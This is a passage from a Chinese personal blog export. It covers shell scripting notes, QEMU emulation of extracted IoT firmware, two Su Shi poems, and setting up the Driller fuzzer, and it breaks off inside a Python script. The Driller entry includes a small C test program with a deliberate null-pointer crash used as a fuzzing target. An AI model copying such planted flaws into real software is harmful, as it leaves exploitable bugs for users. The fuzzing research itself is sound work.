<p>Shell函数没有参数列表并不表示不能传参数，事实上，函数就像是迷你脚本，调用函数时可以传任意个参数，在函数内同样是用<code>$0</code>、<code>$1</code>、<code>$2</code>等变量来提取参数，函数中的位置参数相当于函数的局部变量，改变这些变量并不会影响函数外边的<code>$0</code>、<code>$1</code>、<code>$2</code>等变量。函数中可以用<code>return</code>命令返回，如果<code>return</code>后边跟一个数字则表示函数的 Exit Status。</p>
<p>下面这个脚本可以一次创建多个目录，各目录名通过命令行参数传入，脚本逐个测试各目录是否存在，如果目录不存在，首先打印信息，然后试着创建该目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">is_directory()</span><br><span class="line">&#123;</span><br><span class="line">	DIR_NAME=$1</span><br><span class="line">	if [ ! -d $DIR_NAME ]; then</span><br><span class="line">		return 1</span><br><span class="line">	else</span><br><span class="line">		return 0</span><br><span class="line">	fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for DIR in &quot;$@&quot;; do</span><br><span class="line">	if is_directory &quot;$DIR&quot;</span><br><span class="line">	then : #`:`是一个特殊的命令，称为空命令，该命令不做任何事，但 Exit Status 总是真</span><br><span class="line">	else</span><br><span class="line">		echo &quot;$DIR doesn&#x27;t exist. Creating it now...&quot;</span><br><span class="line">		mkdir $DIR &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">		if [ $? -ne 0 ]; then</span><br><span class="line">			echo &quot;Cannot create directory $DIR &quot;</span><br><span class="line">			exit 1</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">done	</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>在shell脚本中，<code>/dev/null</code>是一个特殊的设备文件，它会将所有写入它的数据都丢弃掉，相当于一个黑洞。<code>2&gt;&amp;1</code>是一个重定向语法，它会将标准错误输出（文件描述符2）重定向到标准输出（文件描述符1）。</p>
<p>因此，<code>/dev/null 2&gt;&amp;1</code>的意思是将输出和错误都重定向到<code>/dev/null</code>，也就是将所有输出和错误都丢弃掉，不显示或记录任何输出和错误信息。这通常用于在shell脚本中禁止输出和错误信息。</p>
<p><a name="Wildcard">[5]</a>：Wildcard，通配符。Wildcard和Globbing的区别：在shell脚本中，Wildcard和Globbing都是用来匹配文件名的通配符，但它们的实现机制和使用方式略有不同，具体如下：</p>
<ul>
<li><p>Wildcard是指在shell命令中使用的通配符，例如<code>*</code>、<code>?</code>、<code>[ ]</code>等符号，它们可以匹配文件名中的任意字符。Wildcard是在shell命令执行前由shell解释器进行展开的，展开后的结果是一组符合条件的文件名列表。例如，<code>ls *.txt</code>命令会展开为所有以<code>.txt</code>结尾的文件名列表。Wildcard只能用于匹配文件名，不能用于匹配目录名。</p>
</li>
<li><p>Globbing是指在shell中使用的一种类似正则表达式的模式匹配技术。Globbing使用的通配符包括<code>*</code>、<code>?</code>、<code>[ ]</code>、<code>&#123; &#125;</code>等符号，它们可以匹配任意字符串、单个字符、字符集合、多个模式等。Globbing也是在shell命令执行前由shell解释器进行展开的，展开后的结果是一组符合条件的字符串列表，可以用于匹配文件名、目录名、环境变量名等各种字符串。例如，<code>echo *.txt</code>命令会展开为所有以<code>.txt</code>结尾的文件名列表。</p>
</li>
</ul>
<p>因此，Wildcard和Globbing都是用于匹配文件名的通配符，但Wildcard只能用于匹配文件名，而Globbing可以用于匹配各种字符串。另外，Wildcard是一种简单的通配符，只能匹配固定的字符集合，而Globbing是一种更复杂的模式匹配技术，可以匹配更灵活的模式。</p>
<h2 id="6-Shell-脚本的调试方法"><a href="#6-Shell-脚本的调试方法" class="headerlink" title="6. Shell 脚本的调试方法"></a>6. Shell 脚本的调试方法</h2><p>Shell 提供了一些用于调试脚本的选项，如下所示：</p>
<p><code>-n</code>：读一边脚本中的命令，但不执行，用于检查脚本中的语法错误。</p>
<p><code>-v</code>：一边执行脚本，一边将执行过的脚本命令打印到标准错误输出。</p>
<p><code>-x</code>：提供跟踪执行信息，将执行的每一条命令和结果依次打印出来。</p>
<p>使用这些选项由三种方法：</p>
<ol>
<li><p>在命令行中提供参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sh -x(/n/v) ./script.sh</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在脚本开头提供参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh -x(/n/v)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在脚本中用<code>set</code>命令启动或禁用参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/sh</span></span><br><span class="line">if [ -z &quot;$1&quot; ]; then</span><br><span class="line">  set -x(/n/v)</span><br><span class="line">  echo &quot;ERROR: Insufficient Args.&quot;</span><br><span class="line">  exit 1</span><br><span class="line">  set +x(/n/v)</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><code>set -x</code>和<code>set +x</code>分别表示启动和禁用<code>-x</code>参数，这样可以只对脚本中的某一段进行跟踪调试。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>使用QEMU的系统模式进行模拟</title>
    <url>/2023/09/21/%E4%BD%BF%E7%94%A8QEMU%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%BC%8F%E8%BF%9B%E8%A1%8C%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h1 id="使用QEMU的系统模式进行模拟"><a href="#使用QEMU的系统模式进行模拟" class="headerlink" title="使用QEMU的系统模式进行模拟"></a>使用QEMU的系统模式进行模拟</h1><p>当 QEMU 运行在系统模式下时，需要为 QEMU 指定内核镜像、IDE硬盘镜像、内核参数。这样一来，使用 QEMU 模拟的虚拟机才能正常运行。<a href="https://people.debian.org/~aurel32/qemu">Debian 官网</a>提供了 QEMU 虚拟机各种平台架构的内核镜像、硬盘文件镜像文件的下载。</p>
<p><del>备注：Debian官网的链接目前还是挂掉的状态，还好有大佬备份下来了arm架构和mips架构的镜像，贴一个网盘链接</del></p>
<blockquote>
<p>链接：<a href="https://pan.baidu.com/s/1me2w5d5Qt31Fyi5jS-TKJg?pwd=brkp">https://pan.baidu.com/s/1me2w5d5Qt31Fyi5jS-TKJg?pwd=brkp</a><br>提取码：brkp</p>
</blockquote>
<span id="more"></span>

<p>以 MIPS 小段架构为例，选择 mipsel 文件夹，按照镜像文件的相关说明（如下），我们根据实际需要选择对应的文件。这里我们使用 32 位的 MIPS 架构为例。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">To use this image, you need to QEMU 1.1.0(or later).</span><br><span class="line">Start QEMU with the following arguments for a 32-bit machine:</span><br><span class="line">  - qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;</span><br><span class="line">  - qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;</span><br><span class="line"></span><br><span class="line">Start QEMU with the following arguments for a 64-bit machine:</span><br><span class="line">- qemu-system-mips64el -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;</span><br><span class="line">  - qemu-system-mips64el -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;</span><br></pre></td></tr></table></figure>

<p>可以看到，我们需要下载 vmlinux-3.2.0-4-4kc-malta 和 debian_wheezy_mipsel_standard.qcow2 这两个文件。把下载下来的两个文件放在同一个目录下。为了让 QEMU 虚拟机能够通信与主机进行网络通信，需要先配置虚拟网卡。这里需要用到<code>tunctl</code>工具，可以通过<code>sudo apt install uml-utilities</code>命令来安装该工具。</p>
<p>安装完<code>tunctl</code>工具之后，接下来配置虚拟网卡，使虚拟机与物理机进行通信，以 Ubuntu 20.04 为例，相关命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">sudo tunctl -t tap0 -u `<span class="built_in">whoami</span>`</span></span><br><span class="line">Set &#x27;tap0&#x27; persistent and owned by uid 1000</span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">sudo ifconfig tap0 10.10.10.1/24</span></span><br><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">ifconfig tap0</span></span><br><span class="line">tap0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.10.10.1  netmask 255.255.255.0  broadcast 10.10.10.255</span><br><span class="line">        ether 0a:e3:05:9a:5e:5b  txqueuelen 1000  (以太网)</span><br><span class="line">        RX packets 8112  bytes 2112112 (2.1 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 12545  bytes 17409722 (17.4 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>配置完之后，执行<code>qemu-system-mipsel</code>命令，启动QEMU虚拟机镜像，并且设置与主机的网络通信。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">~$ </span><span class="language-bash">qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic -net tap,ifname=tap0</span></span><br></pre></td></tr></table></figure>

<p>在启动 QEMU 虚拟机之后，会出现如下登录界面，账户和密码均是<code>root(/user)</code></p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230424202830119.png" alt="image-20230424202830119"></p>
<p>登录后，需要配置 QEMU 虚拟机的网卡。其中网段的设置与之前 Ubuntu 中配置虚拟网卡时用的网段保持一致，然后将 QEMU 虚拟机的 IP 地址设置为 10.10.10.2&#x2F;24 。设置完之后，对虚拟机进行测试，看能否与主机进行通信，如下图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230424203304111.png" alt="image-20230424203304111"></p>
<p>接下来，在 Ubuntu 中，将从固件中提取出来的文件系统比如<code>squashfs-root</code>重新打包，并在当前文件夹下使用 Python2 内置的命令 <code>python -m SimpleHTTPSever</code>开启 Web 服务，以供虚拟机下载打包后的文件（即固件系统）。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230424204139664.png" alt="image-20230424204139664"></p>
<p>开启 HTTP 服务后，在 QEMU 虚拟机中执行<code>wget</code>命令下载并解压文件。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230424204408913.png" alt="image-20230424204408913"></p>
<p>在 QEMU 虚拟机中执行<code>chroot</code>命令，将当前 QEMU 虚拟机的根目录指定为 squsash-root 之后，QEMU 虚拟机系统读取的时新根目录下的目录和文件。也就是说，对固件的目录和文件执行 <code>chroot</code> 命令默认不会切换<code>/dev</code>和<code>/proc</code>，因此在执行<code>chroot</code>命令来切换根目录之前，需要先挂在这两个目录。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230424205132316.png" alt="image-20230424205132316"></p>
<p>在 QEMU 虚拟机中执行 <code>chroot squash-root sh</code>命令，切换 squash-root 为根路径，同时执行<code>busybox</code>的<code>sh</code>命令，进入 shell 模式，启动 HTTP 服务或其他相关服务来模拟组件，如下图所示。</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230424205159264.png" alt="image-20230424205159264"></p>
<p><strong>注：</strong>其他架构的固件模拟过程类似，需要注意的是使用 QEMU 进行模拟时参数的设置，这个挖坑，有空了系统学习一下 qemu 命令一堆复杂的参数。</p>
]]></content>
      <categories>
        <category>IoT</category>
        <category>固件模拟</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>定风波·莫听穿林打叶声</title>
    <url>/2023/10/03/%E5%AE%9A%E9%A3%8E%E6%B3%A2%C2%B7%E8%8E%AB%E5%90%AC%E7%A9%BF%E6%9E%97%E6%89%93%E5%8F%B6%E5%A3%B0/</url>
    <content><![CDATA[<h1 id="定风波·莫听穿林打叶声"><a href="#定风波·莫听穿林打叶声" class="headerlink" title="定风波·莫听穿林打叶声"></a>定风波·莫听穿林打叶声</h1><p>【宋】苏轼</p>
<p>三月七日，沙湖道中遇雨。雨具先行，同行皆狼狈，余独不觉。已而遂晴，故作此词。</p>
<p><strong>莫听穿林打叶声，何妨吟啸且先行。</strong></p>
<p><strong>竹杖芒鞋轻胜马，谁怕，一蓑烟雨任平生。</strong></p>
<p><strong>料峭春风吹酒醒，微冷，山头斜照却相迎。</strong></p>
<p><strong>回首向来萧瑟处，归去，也无风雨也无晴。</strong></p>
]]></content>
      <categories>
        <category>苏轼</category>
      </categories>
  </entry>
  <entry>
    <title>望江南·超然台作</title>
    <url>/2023/10/03/%E6%9C%9B%E6%B1%9F%E5%8D%97%C2%B7%E8%B6%85%E7%84%B6%E5%8F%B0%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="望江南·超然台作"><a href="#望江南·超然台作" class="headerlink" title="望江南·超然台作"></a>望江南·超然台作</h1><p>【宋】苏轼</p>
<p>春未老，风细雨斜斜。试上超然台上望，半壕春水一城花。烟雨暗千家。</p>
<p>寒食后，酒醒却咨嗟。<strong>休对故人思故国，且将新火试新茶。诗酒趁年华。</strong></p>
<p>轼这首词对人生的启示：下阙 “休对故人思故国，且将新火试新茶。诗酒趁年华” ，这三句词给我们许多人生启示。“休对故人思故国”，它告诉我们应当忘记过去，“且将新火试新茶”，又告诉我们要活好当下，“诗酒趁年华”，更告诉我们既要面对未来，又要及时努力。</p>
]]></content>
      <categories>
        <category>苏轼</category>
      </categories>
  </entry>
  <entry>
    <title>Driller源码分析01</title>
    <url>/2023/09/12/Driller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/Driller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9001/</url>
    <content><![CDATA[<h1 id="Driller-项目搭建及测试"><a href="#Driller-项目搭建及测试" class="headerlink" title="Driller 项目搭建及测试"></a>Driller 项目搭建及测试</h1><p>由于年代久远，参考了好多搭建的博客都失败了,各种各样的问题，这里贴两个时间比较靠后的博客：</p>
<blockquote>
<p><a href="https://blog.grimm-co.com/2020/05/guided-fuzzing-with-driller.html">https://blog.grimm-co.com/2020/05/guided-fuzzing-with-driller.html</a></p>
<p><a href="https://n132.github.io/2020/03/04/Driller-Installation.html">https://n132.github.io/2020/03/04/Driller-Installation.html</a></p>
</blockquote>
<p>换了各种 Ubuntu 版本以及 python 的版本，忙活了一天最后也没搭成功。好在，无意间在 docker 仓库里发现了ZJUchenyuan大佬上传的 driller 的镜像，直接 pull 下来用了，测试能跑通！！！</p>
<p>感谢 Docker，感谢 ZJU 的chenyuan大佬救我狗命Orz！！！</p>
<p>安装好 docker 后直接运行下面的命令，拉取镜像就好了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull zjuchenyuan/driller</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>碎碎念：这不比自己装一堆东西方便多了，第一次深切的体会到 docker 的好用，再次感谢 docker！貌似以前对于docker跟虚拟机一直搞混，这次好像对于 docker 的理解更深一步了，算了理解了一点 docker 的运行方式，有时间再开文详写，挖坑ing！</p>
<h2 id="Driller-测试"><a href="#Driller-测试" class="headerlink" title="Driller 测试"></a>Driller 测试</h2><p>镜像文件中是有完整的项目，但是由于对镜像还不是很熟悉，并且镜像里也没有把 afl-fuzz 加入到环境变量，这里就没有选择镜像里的 afl-fuzz，采用本地搭建的 afl，由于需要 Qemu 模式运行 AFL，搭建过程参考之前的博客《AFL Qemu模式》</p>
<p>测试文件 buggy.c 如下：（取自于参考博客2）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> *null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buffer, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> (buffer[<span class="number">0</span>] == <span class="string">&#x27;7&#x27;</span> &amp;&amp; buffer[<span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; buffer[<span class="number">2</span>] == <span class="string">&#x27;4&#x27;</span></span><br><span class="line">      &amp;&amp; buffer[<span class="number">3</span>] == <span class="string">&#x27;2&#x27;</span> &amp;&amp; buffer[<span class="number">4</span>] == <span class="string">&#x27;a&#x27;</span> &amp;&amp; buffer[<span class="number">5</span>] == <span class="string">&#x27;8&#x27;</span>) &#123;</span><br><span class="line">    i = *null;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No problem&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的漏洞是输入一个特定值会crash。正常编译即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop/driller</span><br><span class="line">gcc -o buggy ./buggy.c</span><br></pre></td></tr></table></figure>

<h3 id="fuzz-with-afl"><a href="#fuzz-with-afl" class="headerlink" title="fuzz with afl"></a>fuzz with afl</h3><p>首先，调用 AFL 对其 Fuzz，命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop/driller</span><br><span class="line">mkdir -p workdir/input</span><br><span class="line">echo &#x27;sth&#x27; &gt; workdir/input/seed1</span><br><span class="line">echo core | sudo tee /proc/sys/kernel/core_pattern</span><br><span class="line">/path/to/afl-fuzz -M fuzzer-master -i workdir/input -o workdir/output -Q ./buggy</span><br></pre></td></tr></table></figure>

<p>会出现 AFL 的工作界面，如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230911212621303.png" alt="image-20230911212621303"></p>
<h3 id="fuzz-with-dirller"><a href="#fuzz-with-dirller" class="headerlink" title="fuzz with dirller"></a>fuzz with dirller</h3><p>通过种子进行变异到指定的字符串机率特别低，这里可视为 “卡住” ，此时调用 run_driller.py 脚本运行 driller，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> driller <span class="keyword">import</span> Driller</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_input</span>(<span class="params">content, dest_dir, count</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Saves a new input to a file where AFL can find it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    File will be named id:XXXXXX,driller (where XXXXXX is the current value of</span></span><br><span class="line"><span class="string">    count) and placed in dest_dir.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&#x27;id:%06d,driller&#x27;</span> % count</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(dest_dir, name), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> destfile:</span><br><span class="line">        destfile.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: %s &lt;binary&gt; &lt;fuzzer_output_dir&gt;&#x27;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    _, binary, fuzzer_dir = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Figure out directories and inputs</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(fuzzer_dir, <span class="string">&#x27;fuzz_bitmap&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> bitmap_file:</span><br><span class="line">        fuzzer_bitmap = bitmap_file.read()</span><br><span class="line">    source_dir = os.path.join(fuzzer_dir, <span class="string">&#x27;queue&#x27;</span>)</span><br><span class="line">    dest_dir = os.path.join(fuzzer_dir, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;driller&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make sure destination exists</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.makedirs(dest_dir)</span><br><span class="line">    <span class="keyword">except</span> os.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.errno != errno.EEXIST:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    seen = <span class="built_in">set</span>()  <span class="comment"># Keeps track of source files already drilled</span></span><br><span class="line">    count = <span class="built_in">len</span>(os.listdir(dest_dir))  <span class="comment"># Helps us name outputs correctly</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Repeat forever in case AFL finds something new</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># Go through all of the files AFL has generated, but only once each</span></span><br><span class="line">        <span class="keyword">for</span> source_name <span class="keyword">in</span> os.listdir(source_dir):</span><br><span class="line">            <span class="keyword">if</span> source_name <span class="keyword">in</span> seen <span class="keyword">or</span> <span class="keyword">not</span> source_name.startswith(<span class="string">&#x27;id:&#x27;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            seen.add(source_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(source_dir, source_name), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> seedfile:</span><br><span class="line">                seed = seedfile.read()</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Drilling input: %s&#x27;</span> % seed)</span><br><span class="line">            <span class="keyword">for</span> _, new_input <span class="keyword">in</span> Driller(binary, seed, fuzzer_bitmap).drill_generator():</span><br><span class="line">                save_input(new_input, dest_dir, count)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Try a larger input too because Driller won&#x27;t do it for you</span></span><br><span class="line">            seed = seed + <span class="string">b&#x27;0000&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Drilling input: %s&#x27;</span> % seed)</span><br><span class="line">            <span class="keyword">for</span> _, new_input <span class="keyword">in</span> Driller(binary, seed, fuzzer_bitmap).drill_generator():</span><br><span class="line">                save_input(new_input, dest_dir, count)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>由于 driller 的环境在 docker 里，所以这里的运行脚本命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --<span class="built_in">rm</span> -w /work -it -v `<span class="built_in">pwd</span>`:/work zjuchenyuan/driller python ./run_driller.py ./buggy workdir/output/fuzzer-master</span></span><br></pre></td></tr></table></figure>

<p>这里简单介绍一下参数的作用：</p>
<p><code>--rm</code>： 告诉 Docker 在容器停止后删除容器。</p>
<p><code>-w /work</code>：设置容器的当前工作目录为 <code>/work</code>，在容器内部执行的命令将在这个目录下执行。</p>
<p><code>-it</code>：组合了两个选项，<code>-i</code> 表示要保持与容器的标准输入连接，<code>-t</code> 表示要为容器分配一个伪终端，以便与容器进行交互。</p>
<p><code>-v $(pwd):/work</code>：这个标志用于将本地文件系统的当前工作目录 (<code>pwd</code>) 挂载到容器内部的 <code>/work</code> 目录。这意味着容器可以访问主机上的文件，并且容器内对 <code>/work</code> 目录的任何更改都将反映到主机上。</p>
<p><code>zjuchenyuan/driller</code>：要运行的 Docker 镜像的名称。</p>
<p>执行结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230911213244364.png" alt="image-20230911213244364"></p>
<p>可以看到 Driller 执行符号执行，输出求解得到的结果。貌似找到 crash 后脚本就不再执行，卡住不动了。</p>
<p>我们可以从 <code>workdir/output/fuzzer-master/crashes</code> 文件夹中找到造成 crash 的输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> workdir/output/fuzzer-master/crashes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span> </span><br><span class="line">id:000000,sig:11,sync:driller,src:000016  README.txt</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> <span class="built_in">id</span>\:000000\,sig\:11\,<span class="built_in">sync</span>\:driller\,src\:000016</span> </span><br><span class="line">7/42a8</span><br></pre></td></tr></table></figure>

<p>可以看到 Driller 通过符号执行求解出了造成 crash 的字符串值与程序中设定的一样，至此，Driller 算是成功跑通了，接下来就是分析 Driller 的源码，重点学习其 angr 的使用。</p>
<h3 id="fuzz-with-shellphuzz"><a href="#fuzz-with-shellphuzz" class="headerlink" title="fuzz with shellphuzz"></a>fuzz with shellphuzz</h3><p>这种方法是通过 driller 作者提供的一键式脚本来跑，使用起来更加方便快捷，但就是封装了很多层而已。</p>
<p>shellphuzz脚本命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --rm -w /work -it -v `pwd`:/work zjuchenyuan/driller shellphuzz -d 1 -c 1 -w workdir/shellphuzz/ -C --length-extension 4 ./buggy</span><br></pre></td></tr></table></figure>

<p>这里我一直卡在 <code>[*] Creating fuzzer...</code> 这里，但是我运行 dockerhub 上面镜像给的 demo 是可以用 shellphuzz 脚本跑起来的，好奇怪，先不管了，感觉不是很重要。</p>
]]></content>
      <categories>
        <category>Driller</category>
      </categories>
  </entry>
  <entry>
    <title>Driller源码分析02</title>
    <url>/2023/09/18/Driller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/Driller%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9002/</url>
    <content><![CDATA[<h1 id="Driller-源码分析"><a href="#Driller-源码分析" class="headerlink" title="Driller 源码分析"></a>Driller 源码分析</h1><p>本篇从整体程序的执行流程来分析 Driller 工具的功能，并针对 use_techniques 方法进行了较为详细的解释，理清了 angr 是如何同时应用多个 exploration_techniques 来协同进行符号执行的。</p>
<span id="more"></span>

<h2 id="0x01-run-driller-py-脚本分析"><a href="#0x01-run-driller-py-脚本分析" class="headerlink" title="0x01 run_driller.py 脚本分析"></a>0x01 run_driller.py 脚本分析</h2><p>这里，先放下在项目搭建时，我们用到的运行 driller 的脚本 run_driller.py ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> driller <span class="keyword">import</span> Driller</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_input</span>(<span class="params">content, dest_dir, count</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Saves a new input to a file where AFL can find it.</span></span><br><span class="line"><span class="string">    File will be named id:XXXXXX,driller (where XXXXXX is the current value of</span></span><br><span class="line"><span class="string">    count) and placed in dest_dir.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    name = <span class="string">&#x27;id:%06d,driller&#x27;</span> % count</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(dest_dir, name), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> destfile:</span><br><span class="line">        destfile.write(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: %s &lt;binary&gt; &lt;fuzzer_output_dir&gt;&#x27;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        